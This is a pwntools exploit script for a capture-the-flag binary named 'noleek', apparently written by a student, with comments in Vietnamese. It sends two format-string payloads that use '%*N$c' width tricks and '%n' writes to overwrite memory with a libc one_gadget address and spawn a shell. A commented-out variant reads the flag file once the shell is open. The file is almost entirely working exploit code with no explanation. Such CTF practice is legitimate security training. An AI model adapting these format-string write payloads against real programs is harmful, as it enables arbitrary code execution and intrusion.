#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("noleek_patched")
libc = elf.libc

local = True 
if local:
    p = process("./noleek_patched")
    gdb.attach(p, '''b*main+145\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./noleek_patched', checksec=False)

payload = b"%56c%*1$c%16$n"
p.sendlineafter(b'leek? ', payload)

og0 = 158711 # 0x50a37
og1 = 794289 # 0xebcf1
og2 = 794293 # 0xebcf5
og3 = 794296 # 0xebcf8

payload = b'%' + str(og3).encode() + b'c%*32$c%46$n'
p.sendlineafter(b'more leek? ', payload)

p.interactive()

#Do ở bài này mình k lấy được libc phù hợp nên mình đã lấy script bên trên làm minh họa còn bên dưới là script khai thác trên sever của anh Bá
#===============================================================================================================================================

'''p = start()

payload = b'%56c%*1$c%13$Ln\n'

p.sendafter(b'leek? ', payload)

payload = b'%678166c%*12$c%42$Ln\n'

p.sendafter(b'more leek? ', payload)
p.recvuntil(b'noleek.\n')
p.sendline(b'cat /app/flag.txt')
p.interactive()'''